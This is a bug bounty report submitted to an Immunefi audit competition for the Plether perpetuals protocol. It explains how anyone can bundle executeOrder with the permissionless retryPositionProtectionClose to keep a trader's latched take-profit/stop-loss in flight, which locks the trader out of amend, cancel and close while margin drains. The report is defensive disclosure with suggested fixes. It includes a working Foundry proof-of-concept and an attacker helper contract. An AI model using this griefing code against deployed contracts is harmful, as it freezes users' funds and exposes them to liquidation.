# \#97674 [SC-High] Anyone can keep a `Latched` TP/SL permanently in flight via `retryPositionProtectionClose`, locking the trader out of amend, cancel and every close path while their margin stays pledged and liquidation remains live

**Submitted on Nov 2nd 2026 at 16:08:23 UTC by @Afriauditor for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97674
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)
  - Temporary freezing of funds for at least 24 hours

## Description


# Summary

Once a take-profit/stop-loss attempt fails and the protection becomes `Latched`, the trader is supposed to loosen the close limits (`amendLatchedPositionProtectionCloseLimits`) and have the close retried. But `retryPositionProtectionClose` is permissionless, and every trader-side action requires either `pendingOrderCounts(trader) == 0` or a status the protection can no longer reach: amend requires `Latched` with no pending order, `cancelPositionProtection` and `cancelPositionProtectionAndCommitClose` require `PendingOpen`/`Armed`, and `commitOrder` refuses any account with an active protection (`ProtectionActive`). An unprivileged third party can therefore fail the pending attempt and re-queue a new one in the same transaction, so the trader never observes a window in which to act. The trader cannot fix the limits, cannot cancel the protection, cannot close the position by any route, keeps paying carry on the pledged margin, and can still be liquidated. The attacker needs no capital in the protocol and pays only gas (the attempts carry zero bounty).

Severity: **High — temporary freezing of funds** (the trader's position margin is pledged to a position they are prevented from exiting for as long as the attacker keeps paying gas; the only exits are the attacker stopping or a liquidation). Fallback classification if the judge requires value to be at rest rather than in a position: **Medium — griefing** (no attacker profit, repeated cheap transactions, user blocked from normal function execution). Both are in scope: the scope text states that "harm caused by any caller acting as a keeper is in scope" and keepers are untrusted.

# Description

Relevant state machine in `PositionProtectionBook`:

- After a trigger, the attempt order fails for a retryable reason → `handleFailedProtectionAttempt` sets `Latched` (position still matches).
- `retryPositionProtectionClose(protectionId)` — **no owner check** — requires `Latched`, matching position and `pendingOrderCounts(account) == 0`; it queues a fresh zero-bounty close attempt and sets the status back to `Triggered`.

```solidity
function retryPositionProtectionClose(uint64 protectionId) external nonReentrant returns (uint64 linkedOrderId) {
    StoredProtection storage protection = _activeProtection(protectionId);      // anyone may call
    if (protection.status != Latched) revert OrderRouter__ProtectionNotLatched();
    _requireMatchingPosition(protection);
    if (router.pendingOrderCounts(protection.account) != 0) revert OrderRouter__PendingOrdersExist();
    ...
    linkedOrderId = IPositionProtectionCloseAttemptHost(ROUTER).commitProtectionCloseAttempt(...);
    _recordCloseAttempt(protection, linkedOrderId);                            // status = Triggered
}
```

The trader's four possible reactions are all gated out while an attempt exists:

```solidity
function amendLatchedPositionProtectionCloseLimits(...) {
    if (protection.status != Latched) revert OrderRouter__ProtectionNotLatched();          // Triggered while pending
    if (router.pendingOrderCounts(msg.sender) != 0) revert OrderRouter__PendingOrdersExist();
    ...
}
function _cancel(...) {   // cancelPositionProtection
    if (status != PendingOpen && status != Armed) revert OrderRouter__ProtectionNotArmed(); // Latched/Triggered refused
}
function cancelPositionProtectionAndCommitClose(...) {
    if (protection.status != Armed) revert OrderRouter__ProtectionNotArmed();
}
// OrderLiquidationBatchLogic._validateFreshRequest (ordinary commitOrder):
if (enforceProtectionLock && positionProtectionBook.activePositionProtectionId(account) != 0)
    revert OrderRouter__ProtectionActive();
```

So the trader can only act in the instant between an attempt reaching a terminal failure and the next `retryPositionProtectionClose`. Nothing forces those two events to be separated: `executeOrder` (or `expireOrder` after the deadline) and `retryPositionProtectionClose` are both permissionless and can be called back-to-back in one transaction. An attacker who does so leaves `pendingOrderCounts(trader) == 1` at every block boundary. If the trader's current close limits make the attempt fail deterministically (the PoC uses a `maxExecutionNotionalAssets` ceiling below the position's notional; the same happens when a fee or price move pushes an honest ceiling under the real cost), each bundled transaction fails the attempt with `ConstraintViolation` and immediately re-queues it. The protection oscillates `Triggered → Latched → Triggered` inside the attacker's transaction and is never `Latched` with an empty queue from the trader's point of view.

Consequences for the trader:

- `amendLatchedPositionProtectionCloseLimits` reverts (`ProtectionNotLatched`, or `PendingOrdersExist` in the Latched instant) — the limits that cause every failure can never be fixed.
- `cancelPositionProtection` and `cancelPositionProtectionAndCommitClose` revert (`ProtectionNotArmed`).
- `commitOrder` for a close reverts (`ProtectionActive`).
- The position stays open; its margin stays pledged; carry keeps being realized against that margin (the PoC shows margin decaying from 2,000 to 1,986 USDG over four rounds); and `executeLiquidation` remains fully available, so an adverse move liquidates a trader who was mechanically prevented from closing.

Attacker requirements: none beyond gas. The attempts are zero-bounty, `retryPositionProtectionClose` needs no deposit, and the attacker never needs to be the executor of anything else. The cadence is one transaction per attempt lifetime: immediately if the attempt sits at the FIFO head (as in the PoC), or once per `executionDeadline` (≤ `maxExecutionWindowSeconds`, at most 1 hour) using `expireOrder`/`clearInvalidOrders` when other orders sit ahead of it. The lockout therefore costs the attacker at most one cheap transaction per hour for as long as they care to maintain it.

Root cause: the retry entrypoint is permissionless while the trader's recovery actions are gated on the very state the retry destroys, with no trader-only exit from `Latched`/`Triggered`.

Fix options: make `retryPositionProtectionClose` owner-only (or owner-only for N seconds after a latch so the trader gets a guaranteed window); let the owner cancel a `Latched` protection (the trigger bounty is already paid, so nothing needs refunding); or let `amendLatchedPositionProtectionCloseLimits` apply to the *pending* attempt's stored limits as well.

This is distinct from Cecuro MED-9 (keepers retry without the trader's limits), MED-15 (triggered SHORT attempt stuck on a sentinel), and the scan report's "failed attempts pay the bounty instead of retaining it": none of them concerns an unprivileged party monopolising the retry slot to lock the trader out of every recovery and exit path.

# Impact

**High — temporary freezing of funds.** The trader's pledged margin (2,000 USDG in the PoC, up to the full position margin in general) is held in a position the trader is mechanically prevented from closing, amending or unprotecting, for as long as an unprivileged attacker spends gas; the trader keeps paying carry during the lockout and can be liquidated. The rubric's temporary-freezing tier covers "funds belonging to … another user, which the attacker does not own", and the "acceptable range of operation" exclusion does not apply because the duration is attacker-controlled and renewable indefinitely.

**Fallback — Medium, griefing.** If the judge treats margin in an open position as "at risk" rather than "frozen", the issue is still textbook griefing: the attacker has no profit motive, repeatedly puts the contract into a state that blocks normal function execution for the user, costs the user gas on every failed attempt, and only stops when the attacker stops.

No trusted role is involved. The scope explicitly states keepers are untrusted and that harm caused by any caller acting as a keeper is in scope.


## Proof of Concept

## Proof of Concept


# POC

Foundry test on the repository's production-stack harness (`BasePerpTest`), file `packages/perps/test/perps/poc/PoC_LatchedProtectionLockout.t.sol`. Run from `packages/perps`:

```
forge test --match-path 'test/perps/poc/PoC_LatchedProtection*' -vv
```

Result:

```
[PASS] test_AnyoneCanKeepLatchedProtectionInFlightAndLockTraderOutOfAmendCancelAndClose()
Logs:
  Alice margin after lockout rounds (6-dec USDG): 1986000000
```

What it shows: Alice's TP triggers, the attempt fails on her tight notional ceiling and the protection latches with `pendingOrderCounts == 0` (the honest window; a snapshot proves she could amend there). Mallory — no deposit, no role — calls `retryPositionProtectionClose`, then for four rounds bundles `executeOrder` (fails `ConstraintViolation`) + `retryPositionProtectionClose` in one transaction. In every round Alice's amend, cancel, cancel-and-close and plain close all revert; at the end her position is still open with less margin than she started with, and Mallory's settlement balance is zero.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IPositionProtectionViews} from "@plether/perps/interfaces/IPositionProtectionViews.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/// @dev Unprivileged helper: fails the live protection attempt and immediately re-queues a new one in ONE transaction,
///      so the trader never observes `pendingOrderCounts == 0` and can never amend, cancel or close.
contract LatchGriefer {

    function bundle(
        address router,
        address book,
        uint64 attemptOrderId,
        uint64 protectionId,
        bytes[] calldata pythData
    ) external payable {
        (bool ok,) = router.call{value: msg.value}(
            abi.encodeWithSignature("executeOrder(uint64,bytes[])", attemptOrderId, pythData)
        );
        require(ok, "execute failed");
        IPositionProtectionActions(book).retryPositionProtectionClose(protectionId);
    }

}

contract PoC_LatchedProtectionLockout is BasePerpTest {

    address internal constant ALICE = address(0xA11CE);
    address internal constant TRIGGER_KEEPER = address(0x7106);
    address internal constant MALLORY = address(0x5A1);

    uint256 internal constant MARK_PRICE = 1e8;
    uint256 internal constant POSITION_SIZE = 10_000e18;
    uint256 internal constant POSITION_MARGIN = 2_000e6;
    uint256 internal constant LONG_TAKE_PROFIT = 90_000_000;

    IOrderLifecycleBook internal book;
    IPositionProtectionActions internal protection;
    IPositionProtectionViews internal protectionViews;
    LatchGriefer internal griefer;

    function setUp() public override {
        super.setUp();
        book = IOrderLifecycleBook(address(router.lifecycleBook()));
        protection = IPositionProtectionActions(address(router.positionProtectionBook()));
        protectionViews = IPositionProtectionViews(address(router.positionProtectionBook()));
        griefer = new LatchGriefer();
        _fundTrader(ALICE, 20_000e6);
        _refreshMark(MARK_PRICE);
    }

    function test_AnyoneCanKeepLatchedProtectionInFlightAndLockTraderOutOfAmendCancelAndClose() public {
        // 1. Alice opens and protects her position with a notional ceiling that is too tight.
        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN, MARK_PRICE);
        PositionProtectionTypes.PositionProtectionParams memory params = _params(LONG_TAKE_PROFIT, 0);
        params.closeLimits.maxExecutionNotionalAssets = 1e6;
        vm.prank(ALICE);
        uint64 protectionId = protection.createPositionProtection(params);

        // 2. TP reached, keeper triggers, attempt fails on the ceiling, protection latches.
        uint64 attemptId = _triggerAt(protectionId, LONG_TAKE_PROFIT);
        _executeAttemptExpectingConstraintViolation(attemptId, MALLORY);
        _assertLatched(protectionId);
        assertEq(router.pendingOrderCounts(ALICE), 0, "honest window: Alice could amend right now");

        // Sanity: in that window Alice really can amend.
        uint256 snapshot = vm.snapshotState();
        vm.prank(ALICE);
        protection.amendLatchedPositionProtectionCloseLimits(protectionId, _looseLimits());
        vm.revertToState(snapshot);

        // 3. Mallory re-queues immediately and then keeps the protection "in flight" atomically.
        vm.prank(MALLORY);
        uint64 pendingAttempt = protection.retryPositionProtectionClose(protectionId);

        for (uint256 round; round < 4; ++round) {
            assertEq(router.pendingOrderCounts(ALICE), 1, "an attempt is always pending");
            _assertAliceIsLockedOut(protectionId);

            bytes[] memory data = _mockPythUpdateData(LONG_TAKE_PROFIT);
            uint64 expectedNext = router.nextCommitId();
            vm.prank(MALLORY);
            griefer.bundle(address(router), address(protection), pendingAttempt, protectionId, data);
            pendingAttempt = expectedNext;
            _assertLatchedOrTriggered(protectionId);
        }

        // 4. Position still open, margin still pledged and shrinking, attacker spent nothing but gas.
        (uint256 size, uint256 margin,,,,,) = engine.positions(ALICE);
        assertEq(size, POSITION_SIZE, "position is still open");
        assertLt(margin, POSITION_MARGIN, "and carry keeps eating the pledged margin while Alice is locked out");
        emit log_named_uint("Alice margin after lockout rounds (6-dec USDG)", margin);
        assertEq(_settlementBalance(MALLORY), 0, "Mallory never deposited anything: her only cost is gas");
    }

    function _assertAliceIsLockedOut(uint64 protectionId) internal {
        vm.startPrank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protection.amendLatchedPositionProtectionCloseLimits(protectionId, _looseLimits());

        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protection.cancelPositionProtection(protectionId);

        OrderV3Types.OrderRequest memory close = _closeRequest(bytes32(uint256(block.number)));
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protection.cancelPositionProtectionAndCommitClose(protectionId, close);

        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
        router.commitOrder(close);
        vm.stopPrank();
    }

    function _executeAttemptExpectingConstraintViolation(uint64 attemptId, address executor) internal {
        bytes[] memory data = _mockPythUpdateData(LONG_TAKE_PROFIT);
        vm.prank(executor);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(attemptId, data);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Failed));
        assertEq(uint8(result.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation));
    }

    function _assertLatched(uint64 protectionId) internal view {
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Latched)
        );
    }

    function _assertLatchedOrTriggered(uint64 protectionId) internal view {
        uint8 status = uint8(protectionViews.getPositionProtection(protectionId).status);
        assertTrue(
            status == uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered)
                || status == uint8(PositionProtectionTypes.PositionProtectionStatus.Latched),
            "protection is still active on Alice"
        );
    }

    function _triggerAt(uint64 protectionId, uint256 price) internal returns (uint64 linkedOrderId) {
        _mockPythUpdateData(price);
        bytes[] memory updateData = _livePriceData(price);
        vm.prank(TRIGGER_KEEPER);
        linkedOrderId = protection.triggerPositionProtection(protectionId, updateData);
    }

    function _refreshMark(uint256 price) internal {
        if (vm.getBlockTimestamp() <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        router.updateMarkPrice(_livePriceData(price));
    }

    function _livePriceData(uint256 price) internal view returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        uint256 previous = engine.lastMarkTime();
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(
                ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, vm.getBlockTimestamp(), previous)
            );
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
    }

    function _looseLimits() internal pure returns (PositionProtectionTypes.CloseFinancialLimits memory) {
        return PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
    }

    function _params(uint256 takeProfit, uint256 stopLoss)
        internal pure returns (PositionProtectionTypes.PositionProtectionParams memory params)
    {
        params.takeProfitTriggerPrice = takeProfit;
        params.stopLossTriggerPrice = stopLoss;
        params.closeLimits = _looseLimits();
    }

    function _closeRequest(bytes32 clientOrderId) internal view returns (OrderV3Types.OrderRequest memory request) {
        request.clientOrderId = clientOrderId;
        request.side = CfdTypes.Side.LONG;
        request.sizeDelta = POSITION_SIZE;
        request.marginDelta = 0;
        request.targetPrice = CAP_PRICE;
        request.isClose = true;
        uint256 window = router.maxExecutionWindowSeconds();
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp() + window),
            executionWindowSeconds: uint32(window),
            allowedExecutionModes: 7,
            expectedConfigHash: book.currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

}
```


